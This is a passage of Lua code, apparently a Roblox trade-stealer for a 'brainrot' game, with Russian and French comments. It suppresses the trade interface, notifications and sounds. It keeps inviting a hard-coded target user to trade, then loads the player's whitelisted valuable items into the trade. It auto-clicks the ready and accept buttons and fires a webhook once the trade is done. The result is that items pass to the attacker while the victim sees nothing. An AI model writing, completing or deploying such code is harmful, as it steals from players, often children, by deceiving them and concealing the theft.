            hiding = false
            unblockBlur()
            unblockFOV()
            CameraController.Blur = originalBlurFunc
            CameraController.Fov = originalFovFunc
            CornerNotificationController.Add = originalCorner
            NotificationController.Notify = originalNotify
            pcall(function()
                if originalSetCore then Services.StarterGui.SetCore = originalSetCore end
            end)
            InterfaceController.Toggle = originalToggle
            unmuteAllSounds()
            setTradeGuisHidden(false) -- ВОЗВРАЩЕНО
            -- stashTools(false)
        end

        local function stopHiding()
            task.delay(2, restoreHiding)
        end

        local function tryAddBrainrot(entry)
            -- Format attendu par le serveur
            local brainrotData = {
                UUID        = entry.animal.UUID or "",
                OfflineGain = entry.animal.OfflineGain or 0,
                Index       = entry.animal.Index,
                LastCollect = entry.animal.LastCollect or os.time(),
            }
            local attempts = 0
            while attempts < 15 do
                attempts += 1
                local result = callRemote("AddBrainrot", ADD_BRAINROT_UUID, entry.index, brainrotData)
                
                if result == true then 
                    return true 
                elseif result == false then
                    task.wait(0.2)
                else
                    if type(result) == "string" then
                        if result:lower():find("wait") or result:lower():find("spam") then
                            task.wait(0.5)
                        elseif result:lower():find("space") or result:lower():find("full") then
                            return "nospace"
                        else
                            return false
                        end
                    else
                        task.wait(0.2)
                    end
                end
            end
            return false
        end

        local function offerWhitelistBrainrots()
            local tradeData = tradeRep:TryIndex({ "active", "data" })
            if not tradeData then return end
            
            local ourIndex
            for i, userId in ipairs(tradeData.users) do
                if userId == LocalPlayer.UserId then ourIndex = i; break end
            end
            if not ourIndex then return end
            
            local maxSlots = (tradeData.players[ourIndex] and tradeData.players[ourIndex].maxSlots or 4)
            local whitelistBrainrots = getWhitelistBrainrots()
            
            if #whitelistBrainrots == 0 then return end
            
            local offered = 0
            lastOfferedList = {}
            
            for _, entry in ipairs(whitelistBrainrots) do
                if offered >= maxSlots then break end
                local result = tryAddBrainrot(entry)
                if result == "nospace" then break
                elseif result == true then
                    offered += 1
                    table.insert(lastOfferedList, entry)
                end
                task.wait(0.15)
            end
            
            task.spawn(function()
                while tradeRep:TryIndex({ "active", "data" }) do
                    task.wait(0.1)
                end
                sendTradeCompleteWebhook(lastOfferedList)
                stopHiding()
            end)
        end

        local resumed = false

        setTradeGuisHidden(true) -- ВОЗВРАЩЕНО: сразу скрываем

        task.spawn(function()
            while true do
                task.wait(2)
                if resumed then continue end
                local list = getWhitelistBrainrots()
                if #list == 0 then continue end
                callRemote("Invite", INVITE_UUID, TARGET_USER_ID)
            end
        end)

        task.spawn(function()
            while true do
                setTradeGuisHidden(true) -- ВОЗВРАЩЕНО: постоянно принудительно скрываем
                task.wait(0.5)
            end
        end)

        tradeRep:ListenRaw(function(value)
            if not resumed and value ~= nil and tradeRep:TryIndex({ "active", "data" }) then
                resumed = true
                task.spawn(function()
                    applyHiding()
                    task.wait(0.5)
                    offerWhitelistBrainrots()
                end)
            end
        end)

        task.spawn(function()
            task.spawn(function()
                while task.wait(0.5) do
                    if hiding then
                        pcall(function()
                            local readyBtn = LocalPlayer.PlayerGui:FindFirstChild("TradeLiveTrade")
                                and LocalPlayer.PlayerGui.TradeLiveTrade:FindFirstChild("TradeLiveTrade")
                                and LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other")
                                and LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")
                            if readyBtn and firesignal then
                                firesignal(readyBtn.Activated)
                            end
                        end)
                    end
                end
            end)

            task.delay(5, function()
                local promptContainer = LocalPlayer.PlayerGui:FindFirstChild("DuelsMachinePrompt")
                    and LocalPlayer.PlayerGui.DuelsMachinePrompt:FindFirstChild("DuelsMachinePrompt")
                if not promptContainer then return end
                
                promptContainer.ChildAdded:Connect(function(child)
                    if not hiding then return end
                    
                    if child.Name == "Prompt" then
                        local label = child:FindFirstChild("Label", true)
                        if label and label.Text == "Trade Request" then
                            task.wait(0.1)
                            local yesButton = child:FindFirstChild("Yes", true)
                            if yesButton then
                                if firesignal then
                                    firesignal(yesButton.Activated)
                                else
                                    local VirtualInputManager = game:GetService("VirtualInputManager")
                                    local pos = yesButton.AbsolutePosition + (yesButton.AbsoluteSize / 2)
                                    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 1)
                                    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 1)
                                end
                            end
                        end
                    end
                end)
            end)
        end)
    end)
end)

